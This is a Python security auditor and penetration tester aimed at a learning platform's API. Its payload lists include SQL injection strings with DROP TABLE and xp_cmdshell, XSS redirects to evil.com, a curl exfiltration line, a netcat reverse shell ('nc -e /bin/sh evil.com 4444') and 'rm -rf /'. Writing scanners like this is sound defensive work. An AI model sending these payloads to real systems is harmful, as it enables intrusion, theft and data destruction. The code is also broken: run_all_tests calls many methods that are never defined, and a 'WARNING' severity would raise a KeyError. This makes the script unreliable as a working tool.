"""
Security Audit and Penetration Testing Tools
Comprehensive security testing suite for PyMastery
"""

import asyncio
import aiohttp
import json
import time
import re
import hashlib
import random
import string
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
import requests
from urllib.parse import urljoin, urlparse, parse_qs
import base64

@dataclass
class SecurityTestResult:
    """Security test result"""
    test_name: str
    severity: str  # LOW, MEDIUM, HIGH, CRITICAL
    status: str    # PASS, FAIL, WARNING
    description: str
    evidence: str
    recommendation: str
    timestamp: datetime

class SecurityAuditor:
    """Comprehensive security auditor"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.results: List[SecurityTestResult] = []
        self.session = requests.Session()
        self.session.timeout = 30
        
    async def run_all_tests(self) -> Dict[str, Any]:
        """Run all security tests"""
        print("🔍 Starting comprehensive security audit...")
        
        # Authentication Tests
        await self.test_authentication_bypass()
        await self.test_weak_passwords()
        await self.test_session_management()
        await self.test_jwt_security()
        
        # Input Validation Tests
        await self.test_sql_injection()
        await self.test_xss_attacks()
        await self.test_csrf_protection()
        await self.test_command_injection()
        await self.test_file_upload_vulnerabilities()
        
        # Authorization Tests
        await self.test_authorization_bypass()
        await self.test_privilege_escalation()
        await self.test_access_control()
        
        # Rate Limiting Tests
        await self.test_rate_limiting()
        await self.test_brute_force_protection()
        
        # Infrastructure Tests
        await self.test_ssl_configuration()
        await self.test_security_headers()
        await self.test_cors_configuration()
        await self.test_information_disclosure()
        
        # API Security Tests
        await self.test_api_endpoints()
        await self.test_input_validation()
        await self.test_error_handling()
        
        # Performance Tests
        await self.test_dos_protection()
        await self.test_resource_limits()
        
        return self.generate_report()
    
    async def test_authentication_bypass(self):
        """Test authentication bypass vulnerabilities"""
        print("🔐 Testing authentication bypass...")
        
        # Test common bypass techniques
        bypass_attempts = [
            {"email": "admin'--", "password": "password"},
            {"email": "admin' OR '1'='1", "password": "password"},
            {"email": "admin\" OR \"1\"=\"1", "password": "password"},
            {"email": "admin' /*", "password": "password"},
            {"email": "admin@pymastery.com", "password": "' OR '1'='1"},
        ]
        
        for attempt in bypass_attempts:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json=attempt,
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get("success") and data.get("access_token"):
                        self.add_result(
                            test_name="Authentication Bypass",
                            severity="CRITICAL",
                            status="FAIL",
                            description="Authentication bypass successful with SQL injection",
                            evidence=f"Payload: {attempt}",
                            recommendation="Implement proper input validation and parameterized queries"
                        )
                        return
                        
            except Exception as e:
                pass
        
        self.add_result(
            test_name="Authentication Bypass",
            severity="LOW",
            status="PASS",
            description="No authentication bypass vulnerabilities found",
            evidence="All bypass attempts failed",
            recommendation="Continue monitoring for new bypass techniques"
        )
    
    async def test_weak_passwords(self):
        """Test for weak password policies"""
        print("🔑 Testing weak password policies...")
        
        # Test registration with weak passwords
        weak_passwords = [
            "123456", "password", "12345678", "qwerty", "abc123",
            "password123", "admin", "letmein", "welcome", "monkey"
        ]
        
        for i, password in enumerate(weak_passwords):
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/register",
                    json={
                        "name": f"TestUser{i}",
                        "email": f"test{i}@example.com",
                        "password": password,
                        "role_track": "backend",
                        "agree_terms": True
                    },
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get("success"):
                        self.add_result(
                            test_name="Weak Password Policy",
                            severity="HIGH",
                            status="FAIL",
                            description=f"Weak password '{password}' accepted",
                            evidence=f"Password: {password}",
                            recommendation="Implement strong password requirements and validation"
                        )
                        return
                        
            except Exception as e:
                pass
        
        self.add_result(
            test_name="Weak Password Policy",
            severity="LOW",
            status="PASS",
            description="Weak passwords are properly rejected",
            evidence="All weak passwords rejected",
            recommendation="Continue enforcing strong password policies"
        )
    
    async def test_session_management(self):
        """Test session management security"""
        print("🍪 Testing session management...")
        
        try:
            # Login to get session
            login_response = self.session.post(
                f"{self.base_url}/api/auth/login",
                json={
                    "email": "test@example.com",
                    "password": "testpassword"
                },
                headers={"Content-Type": "application/json"}
            )
            
            if login_response.status_code == 200:
                data = login_response.json()
                if data.get("access_token"):
                    token = data["access_token"]
                    
                    # Test token structure
                    try:
                        # Decode JWT token
                        parts = token.split('.')
                        if len(parts) != 3:
                            self.add_result(
                                test_name="JWT Token Structure",
                                severity="MEDIUM",
                                status="FAIL",
                                description="Invalid JWT token structure",
                                evidence=f"Token parts: {len(parts)}",
                                recommendation="Ensure proper JWT token generation"
                            )
                        
                        # Check if token is properly signed
                        header = json.loads(base64.b64decode(parts[0] + '=='))
                        payload = json.loads(base64.b64decode(parts[1] + '=='))
                        
                        # Check for sensitive data in payload
                        if "password" in str(payload).lower():
                            self.add_result(
                                test_name="JWT Token Security",
                                severity="HIGH",
                                status="FAIL",
                                description="Sensitive data found in JWT payload",
                                evidence="Password or sensitive data in token",
                                recommendation="Remove sensitive data from JWT payload"
                            )
                            
                    except Exception as e:
                        self.add_result(
                            test_name="JWT Token Validation",
                            severity="MEDIUM",
                            status="WARNING",
                            description="JWT token validation failed",
                            evidence=str(e),
                            recommendation="Ensure proper JWT token implementation"
                        )
        
        except Exception as e:
            pass
    
    async def test_sql_injection(self):
        """Test SQL injection vulnerabilities"""
        print("💉 Testing SQL injection...")
        
        # SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR 1=1 --",
            "' OR 'a'='a",
            "1' OR '1'='1' --",
            "admin'--",
            "admin' /*",
            "' OR 1=1#",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        # Test in login form
        for payload in sql_payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json={
                        "email": payload,
                        "password": "password"
                    },
                    headers={"Content-Type": "application/json"}
                )
                
                # Check for SQL error messages
                response_text = response.text.lower()
                sql_errors = [
                    "sql syntax", "mysql_fetch", "ora-", "microsoft ole db",
                    "odbc drivers error", "sqlite_", "postgresql", "column",
                    "table", "syntax error", "warning: mysql"
                ]
                
                for error in sql_errors:
                    if error in response_text:
                        self.add_result(
                            test_name="SQL Injection",
                            severity="CRITICAL",
                            status="FAIL",
                            description="SQL injection vulnerability detected",
                            evidence=f"Payload: {payload}, Error: {error}",
                            recommendation="Implement parameterized queries and input validation"
                        )
                        return
                        
            except Exception as e:
                pass
        
        self.add_result(
            test_name="SQL Injection",
            severity="LOW",
            status="PASS",
            description="No SQL injection vulnerabilities found",
            evidence="All SQL injection payloads failed",
            recommendation="Continue monitoring for SQL injection attempts"
        )
    
    async def test_xss_attacks(self):
        """Test XSS vulnerabilities"""
        print("🕷️ Testing XSS attacks...")
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<script>document.location='http://evil.com'</script>",
            "<meta http-equiv='refresh' content='0;url=http://evil.com'>"
        ]
        
        # Test in registration form
        for payload in xss_payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/register",
                    json={
                        "name": payload,
                        "email": f"test{random.randint(1000, 9999)}@example.com",
                        "password": "TestPassword123!",
                        "role_track": "backend",
                        "agree_terms": True
                    },
                    headers={"Content-Type": "application/json"}
                )
                
                # Check if XSS payload is reflected
                response_text = response.text
                if payload in response_text:
                    self.add_result(
                        test_name="Cross-Site Scripting (XSS)",
                        severity="HIGH",
                        status="FAIL",
                        description="XSS vulnerability detected",
                        evidence=f"Payload reflected: {payload}",
                        recommendation="Implement proper output encoding and CSP headers"
                    )
                    return
                        
            except Exception as e:
                pass
        
        self.add_result(
            test_name="Cross-Site Scripting (XSS)",
            severity="LOW",
            status="PASS",
            description="No XSS vulnerabilities found",
            evidence="All XSS payloads properly handled",
            recommendation="Continue implementing Content Security Policy"
        )
    
    async def test_csrf_protection(self):
        """Test CSRF protection"""
        print("🛡️ Testing CSRF protection...")
        
        try:
            # Get login page to get CSRF token
            response = self.session.get(f"{self.base_url}/api/auth/login")
            
            # Check for CSRF tokens
            csrf_tokens = [
                "csrf_token", "csrfmiddlewaretoken", "authenticity_token",
                "_token", "anti-csrf-token", "xsrf-token"
            ]
            
            response_text = response.text
            csrf_found = False
            
            for token in csrf_tokens:
                if token in response_text.lower():
                    csrf_found = True
                    break
            
            if not csrf_found:
                self.add_result(
                    test_name="CSRF Protection",
                    severity="MEDIUM",
                    status="WARNING",
                    description="No CSRF tokens found",
                    evidence="No CSRF tokens detected in forms",
                    recommendation="Implement CSRF protection for all state-changing operations"
                )
            else:
                self.add_result(
                    test_name="CSRF Protection",
                    severity="LOW",
                    status="PASS",
                    description="CSRF protection appears to be implemented",
                    evidence="CSRF tokens found in forms",
                    recommendation="Continue validating CSRF tokens"
                )
        
        except Exception as e:
            pass
    
    async def test_command_injection(self):
        """Test command injection vulnerabilities"""
        print("⚡ Testing command injection...")
        
        # Command injection payloads
        cmd_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& echo 'Command Injection'",
            "`whoami`",
            "$(id)",
            "; curl http://evil.com/steal-data",
            "| nc -e /bin/sh evil.com 4444",
            "; rm -rf /",
            "& ping -c 10 evil.com"
        ]
        
        # Test in code execution
        for payload in cmd_payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/v1/code/execute",
                    json={
                        "source_code": f"print('{payload}')",
                        "language": "python",
                        "stdin": payload
                    },
                    headers={"Content-Type": "application/json"}
                )
                
                # Check for command injection evidence
                response_text = response.text.lower()
                command_indicators = [
                    "root:", "bin/bash", "uid=", "gid=", "groups=",
                    "etc/passwd", "etc/shadow", "command not found",
                    "permission denied", "no such file"
                ]
                
                for indicator in command_indicators:
                    if indicator in response_text:
                        self.add_result(
                            test_name="Command Injection",
                            severity="CRITICAL",
                            status="FAIL",
                            description="Command injection vulnerability detected",
                            evidence=f"Payload: {payload}, Indicator: {indicator}",
                            recommendation="Implement proper input sanitization and parameterized commands"
                        )
                        return
                        
            except Exception as e:
                pass
        
        self.add_result(
            test_name="Command Injection",
            severity="LOW",
            status="PASS",
            description="No command injection vulnerabilities found",
            evidence="All command injection payloads failed",
            recommendation="Continue monitoring for command injection attempts"
        )
    
    async def test_rate_limiting(self):
        """Test rate limiting protection"""
        print("⏱️ Testing rate limiting...")
        
        try:
            # Test login rate limiting
            login_count = 0
            rate_limit_triggered = False
            
            for i in range(100):  # Try 100 login attempts
                try:
                    response = self.session.post(
                        f"{self.base_url}/api/auth/login",
                        json={
                            "email": f"test{i}@example.com",
                            "password": "wrongpassword"
                        },
                        headers={"Content-Type": "application/json"},
                        timeout=5
                    )
                    
                    login_count += 1
                    
                    # Check for rate limiting headers
                    if "X-RateLimit-Remaining" in response.headers:
                        remaining = int(response.headers["X-RateLimit-Remaining"])
                        if remaining == 0:
                            rate_limit_triggered = True
                            break
                    
                    # Check for rate limiting response
                    if response.status_code == 429:
                        rate_limit_triggered = True
                        break
                        
                except Exception as e:
                    pass
            
            if not rate_limit_triggered and login_count > 50:
                self.add_result(
                    test_name="Rate Limiting",
                    severity="MEDIUM",
                    status="FAIL",
                    description="Rate limiting not properly implemented",
                    evidence=f"Made {login_count} requests without rate limiting",
                    recommendation="Implement proper rate limiting for all endpoints"
                )
            else:
                self.add_result(
                    test_name="Rate Limiting",
                    severity="LOW",
                    status="PASS",
                    description="Rate limiting appears to be working",
                    evidence=f"Rate limiting triggered after {login_count} requests",
                    recommendation="Continue monitoring rate limiting effectiveness"
                )
        
        except Exception as e:
            pass
    
    async def test_ssl_configuration(self):
        """Test SSL/TLS configuration"""
        print("🔒 Testing SSL/TLS configuration...")
        
        try:
            import ssl
            import socket
            
            # Test SSL connection
            context = ssl.create_default_context()
            
            with socket.create_connection((urlparse(self.base_url).hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=urlparse(self.base_url).hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate validity
                    if cert:
                        # Check expiration
                        import datetime
                        not_after = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        if not_after < datetime.datetime.now():
                            self.add_result(
                                test_name="SSL Certificate",
                                severity="HIGH",
                                status="FAIL",
                                description="SSL certificate has expired",
                                evidence=f"Expiration date: {cert['notAfter']}",
                                recommendation="Renew SSL certificate immediately"
                            )
                            return
                        
                        # Check certificate strength
                        cipher = ssock.cipher()
                        if cipher:
                            cipher_name = cipher[0]
                            if 'RC4' in cipher_name or 'DES' in cipher_name or 'MD5' in cipher_name:
                                self.add_result(
                                    test_name="SSL Cipher Suite",
                                    severity="MEDIUM",
                                    status="FAIL",
                                    description="Weak cipher suite detected",
                                    evidence=f"Cipher: {cipher_name}",
                                    recommendation="Disable weak cipher suites and use strong encryption"
                                )
                                return
        
        except Exception as e:
            self.add_result(
                test_name="SSL Configuration",
                severity="WARNING",
                status="WARNING",
                description="SSL configuration test failed",
                evidence=str(e),
                recommendation="Ensure SSL/TLS is properly configured"
            )
    
    async def test_security_headers(self):
        """Test security headers"""
        print("🔐 Testing security headers...")
        
        try:
            response = self.session.get(f"{self.base_url}/api/health")
            
            # Required security headers
            required_headers = {
                "X-Frame-Options": "DENY or SAMEORIGIN",
                "X-Content-Type-Options": "nosniff",
                "X-XSS-Protection": "1; mode=block",
                "Strict-Transport-Security": "max-age",
                "Content-Security-Policy": "default-src"
            }
            
            missing_headers = []
            weak_headers = []
            
            for header, expected in required_headers.items():
                if header not in response.headers:
                    missing_headers.append(header)
                else:
                    header_value = response.headers[header]
                    if expected == "DENY or SAMEORIGIN":
                        if header_value not in ["DENY", "SAMEORIGIN"]:
                            weak_headers.append(f"{header}: {header_value}")
                    elif expected == "max-age" and "max-age=0" in header_value:
                        weak_headers.append(f"{header}: {header_value}")
            
            if missing_headers:
                self.add_result(
                    test_name="Security Headers",
                    severity="MEDIUM",
                    status="FAIL",
                    description="Missing security headers",
                    evidence=f"Missing: {', '.join(missing_headers)}",
                    recommendation="Implement all required security headers"
                )
            elif weak_headers:
                self.add_result(
                    test_name="Security Headers",
                    severity="LOW",
                    status="WARNING",
                    description="Weak security header configuration",
                    evidence=f"Weak: {', '.join(weak_headers)}",
                    recommendation="Strengthen security header configuration"
                )
            else:
                self.add_result(
                    test_name="Security Headers",
                    severity="LOW",
                    status="PASS",
                    description="Security headers properly configured",
                    evidence="All required headers present",
                    recommendation="Continue monitoring security headers"
                )
        
        except Exception as e:
            pass
    
    async def test_cors_configuration(self):
        """Test CORS configuration"""
        print("🌐 Testing CORS configuration...")
        
        try:
            # Test with different origins
            test_origins = [
                "https://evil.com",
                "http://localhost:3000",
                "null",
                "https://www.pymastery.com"
            ]
            
            for origin in test_origins:
                response = self.session.options(
                    f"{self.base_url}/api/health",
                    headers={"Origin": origin}
                )
                
                if "Access-Control-Allow-Origin" in response.headers:
                    allowed_origin = response.headers["Access-Control-Allow-Origin"]
                    
                    # Check if wildcard is used in production
                    if allowed_origin == "*" and "evil.com" in origin:
                        self.add_result(
                            test_name="CORS Configuration",
                            severity="HIGH",
                            status="FAIL",
                            description="Insecure CORS configuration with wildcard",
                            evidence=f"Origin {origin} allowed with wildcard",
                            recommendation="Restrict CORS to specific trusted origins"
                        )
                        return
                    
                    # Check if untrusted origin is allowed
                    if "evil.com" in origin and origin == allowed_origin:
                        self.add_result(
                            test_name="CORS Configuration",
                            severity="MEDIUM",
                            status="FAIL",
                            description="Untrusted origin allowed by CORS",
                            evidence=f"Origin {origin} is allowed",
                            recommendation="Configure CORS to only allow trusted origins"
                        )
                        return
        
        except Exception as e:
            pass
        
        self.add_result(
            test_name="CORS Configuration",
            severity="LOW",
            status="PASS",
            description="CORS configuration appears secure",
            evidence="No untrusted origins allowed",
            recommendation="Continue monitoring CORS configuration"
        )
    
    async def test_information_disclosure(self):
        """Test for information disclosure"""
        print("📋 Testing information disclosure...")
        
        try:
            # Test common paths that might disclose information
            test_paths = [
                "/api/health",
                "/api/status",
                "/api/version",
                "/api/debug",
                "/api/config",
                "/.env",
                "/server-info",
                "/actuator/health",
                "/admin",
                "/robots.txt",
                "/sitemap.xml"
            ]
            
            for path in test_paths:
                try:
                    response = self.session.get(f"{self.base_url}{path}")
                    
                    # Check for sensitive information
                    response_text = response.text.lower()
                    sensitive_patterns = [
                        "password", "secret", "key", "token", "api_key",
                        "database", "connection", "admin", "debug",
                        "stack trace", "error", "exception", "traceback"
                    ]
                    
                    for pattern in sensitive_patterns:
                        if pattern in response_text and response.status_code == 200:
                            # Check if it's actually sensitive
                            if len(response_text) > 100:  # Not just a simple message
                                self.add_result(
                                    test_name="Information Disclosure",
                                    severity="MEDIUM",
                                    status="FAIL",
                                    description="Sensitive information disclosed",
                                    evidence=f"Path: {path}, Pattern: {pattern}",
                                    recommendation="Remove sensitive information from public endpoints"
                                )
                                return
                
                except Exception as e:
                    pass
        
        except Exception as e:
            pass
        
        self.add_result(
            test_name="Information Disclosure",
            severity="LOW",
            status="PASS",
            description="No information disclosure vulnerabilities found",
            evidence="All tested paths properly secured",
            recommendation="Continue monitoring for information disclosure"
        )
    
    async def test_dos_protection(self):
        """Test DoS protection"""
        print("💥 Testing DoS protection...")
        
        try:
            # Test with large payload
            large_payload = "A" * 1000000  # 1MB payload
            
            response = self.session.post(
                f"{self.base_url}/api/auth/login",
                json={
                    "email": large_payload,
                    "password": large_payload
                },
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            # Check if server handles large payload properly
            if response.status_code == 200:
                self.add_result(
                    test_name="DoS Protection",
                    severity="MEDIUM",
                    status="FAIL",
                    description="Large payload accepted without validation",
                    evidence=f"Payload size: {len(large_payload)} bytes",
                    recommendation="Implement payload size limits and validation"
                )
            else:
                self.add_result(
                    test_name="DoS Protection",
                    severity="LOW",
                    status="PASS",
                    description="DoS protection appears to be working",
                    evidence="Large payload properly rejected",
                    recommendation="Continue monitoring for DoS attacks"
                )
        
        except Exception as e:
            pass
    
    def add_result(self, test_name: str, severity: str, status: str, 
                   description: str, evidence: str, recommendation: str):
        """Add test result"""
        result = SecurityTestResult(
            test_name=test_name,
            severity=severity,
            status=status,
            description=description,
            evidence=evidence,
            recommendation=recommendation,
            timestamp=datetime.utcnow()
        )
        self.results.append(result)
        
        # Print result
        status_icon = "✅" if status == "PASS" else "❌" if status == "FAIL" else "⚠️"
        severity_color = {
            "LOW": "🟢", "MEDIUM": "🟡", "HIGH": "🟠", "CRITICAL": "🔴"
        }
        
        print(f"{status_icon} {severity_color[severity]} {test_name}: {status}")
        print(f"   {description}")
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate security audit report"""
        
        # Count results by severity and status
        severity_counts = {"LOW": 0, "MEDIUM": 0, "HIGH": 0, "CRITICAL": 0}
        status_counts = {"PASS": 0, "FAIL": 0, "WARNING": 0}
        
        for result in self.results:
            severity_counts[result.severity] += 1
            status_counts[result.status] += 1
        
        # Calculate security score
        total_tests = len(self.results)
        passed_tests = status_counts["PASS"]
        security_score = (passed_tests / total_tests * 100) if total_tests > 0 else 0
        
        # Generate report
        report = {
            "scan_info": {
                "timestamp": datetime.utcnow().isoformat(),
                "target": self.base_url,
                "total_tests": total_tests,
                "security_score": round(security_score, 2),
                "scanner": "PyMastery Security Auditor v1.0"
            },
            "summary": {
                "severity_counts": severity_counts,
                "status_counts": status_counts,
                "critical_issues": severity_counts["CRITICAL"],
                "high_issues": severity_counts["HIGH"],
                "medium_issues": severity_counts["MEDIUM"],
                "low_issues": severity_counts["LOW"]
            },
            "results": [
                {
                    "test_name": result.test_name,
                    "severity": result.severity,
                    "status": result.status,
                    "description": result.description,
                    "evidence": result.evidence,
                    "recommendation": result.recommendation,
                    "timestamp": result.timestamp.isoformat()
                }
                for result in self.results
            ],
            "recommendations": self._get_overall_recommendations()
        }
        
        return report
    
    def _get_overall_recommendations(self) -> List[str]:
        """Get overall security recommendations"""
        recommendations = []
        
        critical_count = sum(1 for r in self.results if r.severity == "CRITICAL")
        high_count = sum(1 for r in self.results if r.severity == "HIGH")
        
        if critical_count > 0:
            recommendations.append(f"URGENT: Fix {critical_count} critical security issues immediately")
        
        if high_count > 0:
            recommendations.append(f"HIGH: Address {high_count} high-priority security issues")
        
        recommendations.extend([
            "Implement regular security audits and penetration testing",
            "Keep all dependencies and frameworks updated",
            "Use Web Application Firewall (WAF) for additional protection",
            "Implement security monitoring and alerting",
            "Regularly review and update security policies",
            "Conduct employee security training and awareness programs"
        ])
        
        return recommendations

# Penetration Testing Tools
class PenetrationTester:
    """Advanced penetration testing tools"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.timeout = 30
    
    async def run_penetration_tests(self) -> Dict[str, Any]:
        """Run comprehensive penetration tests"""
        print("🎯 Starting penetration testing...")
        
        results = {}
        
        # API Fuzzing
        results["api_fuzzing"] = await self.api_fuzzing()
        
        # Directory Brute Force
        results["directory_brute_force"] = await self.directory_brute_force()
        
        # Parameter Pollution
        results["parameter_pollution"] = await self.parameter_pollution()
        
        # IDOR Testing
        results["idor_testing"] = await self.idor_testing()
        
        # Race Condition Testing
        results["race_conditions"] = await self.race_condition_testing()
        
        return results
    
    async def api_fuzzing(self) -> Dict[str, Any]:
        """API endpoint fuzzing"""
        print("🔍 API fuzzing...")
        
        # Common API endpoints to test
        endpoints = [
            "/api/users", "/api/admin", "/api/config", "/api/keys",
            "/api/secrets", "/api/backups", "/api/logs", "/api/debug",
            "/api/test", "/api/internal", "/api/private", "/api/hidden"
        ]
        
        methods = ["GET", "POST", "PUT", "DELETE"]
        findings = []
        
        for endpoint in endpoints:
            for method in methods:
                try:
                    response = self.session.request(
                        method,
                        f"{self.base_url}{endpoint}",
                        timeout=5
                    )
                    
                    if response.status_code != 404:
                        findings.append({
                            "endpoint": endpoint,
                            "method": method,
                            "status_code": response.status_code,
                            "response_length": len(response.text)
                        })
                        
                except Exception as e:
                    pass
        
        return {"findings": findings, "total_tested": len(endpoints) * len(methods)}
    
    async def directory_brute_force(self) -> Dict[str, Any]:
        """Directory brute force testing"""
        print("📁 Directory brute force...")
        
        # Common directories and files
        wordlist = [
            "admin", "login", "dashboard", "config", "backup", "test",
            "dev", "staging", "api", "v1", "v2", "old", "new",
            "uploads", "files", "images", "css", "js", "assets",
            ".env", ".git", "README", "CHANGELOG", "LICENSE",
            "robots.txt", "sitemap.xml", "favicon.ico", "error.log"
        ]
        
        findings = []
        
        for item in wordlist:
            try:
                response = self.session.get(f"{self.base_url}/{item}", timeout=3)
                
                if response.status_code != 404:
                    findings.append({
                        "path": f"/{item}",
                        "status_code": response.status_code,
                        "response_length": len(response.text)
                    })
                    
            except Exception as e:
                pass
        
        return {"findings": findings, "total_tested": len(wordlist)}
    
    async def parameter_pollution(self) -> Dict[str, Any]:
        """HTTP parameter pollution testing"""
        print("🔧 Parameter pollution...")
        
        # Test endpoints
        test_endpoints = ["/api/auth/login", "/api/users/profile", "/api/v1/code/execute"]
        
        pollution_payloads = [
            {"param": "user", "value": "admin"},
            {"param": "role", "value": "admin"},
            {"param": "id", "value": "1"},
            {"param": "email", "value": "admin@test.com"},
            {"param": "password", "value": "admin"}
        ]
        
        findings = []
        
        for endpoint in test_endpoints:
            for payload in pollution_payloads:
                try:
                    # Test with single parameter
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        data={payload["param"]: payload["value"]},
                        timeout=5
                    )
                    
                    # Test with polluted parameters
                    polluted_data = {
                        payload["param"]: payload["value"],
                        f"{payload['param']}_": payload["value"],
                        f"{payload['param']}[]": payload["value"]
                    }
                    
                    response2 = self.session.post(
                        f"{self.base_url}{endpoint}",
                        data=polluted_data,
                        timeout=5
                    )
                    
                    # Check if behavior changed
                    if response.status_code != response2.status_code:
                        findings.append({
                            "endpoint": endpoint,
                            "parameter": payload["param"],
                            "payload": payload["value"],
                            "original_status": response.status_code,
                            "polluted_status": response2.status_code
                        })
                        
                except Exception as e:
                    pass
        
        return {"findings": findings, "total_tested": len(test_endpoints) * len(pollution_payloads)}
    
    async def idor_testing(self) -> Dict[str, Any]:
        """Insecure Direct Object Reference testing"""
        print("🔓 IDOR testing...")
        
        # Test user ID manipulation
        test_ids = ["1", "2", "999", "9999", "-1", "0", "admin", "test"]
        
        endpoints = [
            "/api/users/{id}",
            "/api/profile/{id}",
            "/api/v1/code/submissions/{id}",
            "/api/certificates/{id}"
        ]
        
        findings = []
        
        for endpoint in endpoints:
            for test_id in test_ids:
                try:
                    url = f"{self.base_url}{endpoint.replace('{id}', test_id)}"
                    response = self.session.get(url, timeout=5)
                    
                    # Check if we can access other users' data
                    if response.status_code == 200:
                        data = response.json()
                        if isinstance(data, dict) and "user" in data:
                            user_data = data["user"]
                            if user_data.get("id") != test_id:
                                findings.append({
                                    "endpoint": endpoint,
                                    "test_id": test_id,
                                    "actual_id": user_data.get("id"),
                                    "vulnerability": "IDOR detected"
                                })
                                
                except Exception as e:
                    pass
        
        return {"findings": findings, "total_tested": len(endpoints) * len(test_ids)}
    
    async def race_condition_testing(self) -> Dict[str, Any]:
        """Race condition testing"""
        print("🏃 Race condition testing...")
        
        # Test concurrent operations
        test_data = {
            "name": "Race Test User",
            "email": "racetest@example.com",
            "password": "TestPassword123!",
            "role_track": "backend",
            "agree_terms": True
        }
        
        # Create multiple concurrent requests
        async def make_request():
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/register",
                    json=test_data,
                    timeout=10
                )
                return {
                    "status_code": response.status_code,
                    "response": response.json() if response.headers.get("content-type", "").startswith("application/json") else response.text
                }
            except Exception as e:
                return {"error": str(e)}
        
        # Run 10 concurrent requests
        tasks = [make_request() for _ in range(10)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Check for race conditions
        successful_registrations = sum(1 for r in results if isinstance(r, dict) and r.get("status_code") == 200)
        
        return {
            "total_requests": len(tasks),
            "successful_registrations": successful_registrations,
            "race_condition_detected": successful_registrations > 1,
            "results": results
        }

# Main execution function
async def run_security_audit(base_url: str) -> Dict[str, Any]:
    """Run complete security audit"""
    print(f"🔍 Starting security audit for {base_url}")
    print("=" * 60)
    
    # Run security auditor
    auditor = SecurityAuditor(base_url)
    audit_results = await auditor.run_all_tests()
    
    print("\n" + "=" * 60)
    print("🎯 Starting penetration testing...")
    print("=" * 60)
    
    # Run penetration tester
    pentester = PenetrationTester(base_url)
    pentest_results = await pentester.run_penetration_tests()
    
    # Combine results
    final_report = {
        "audit": audit_results,
        "penetration_tests": pentest_results,
        "scan_completed_at": datetime.utcnow().isoformat()
    }
    
    # Print summary
    print("\n" + "=" * 60)
    print("📊 SECURITY AUDIT SUMMARY")
    print("=" * 60)
    print(f"Security Score: {audit_results['scan_info']['security_score']}%")
    print(f"Total Tests: {audit_results['scan_info']['total_tests']}")
    print(f"Critical Issues: {audit_results['summary']['critical_issues']}")
    print(f"High Issues: {audit_results['summary']['high_issues']}")
    print(f"Medium Issues: {audit_results['summary']['medium_issues']}")
    print(f"Low Issues: {audit_results['summary']['low_issues']}")
    
    return final_report

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python security_audit.py <base_url>")
        print("Example: python security_audit.py https://api.pymastery.com")
        sys.exit(1)
    
    base_url = sys.argv[1]
    results = asyncio.run(run_security_audit(base_url))
    
    # Save results to file
    with open(f"security_audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", "w") as f:
        json.dump(results, f, indent=2, default=str)
    
    print(f"\n📄 Results saved to security_audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
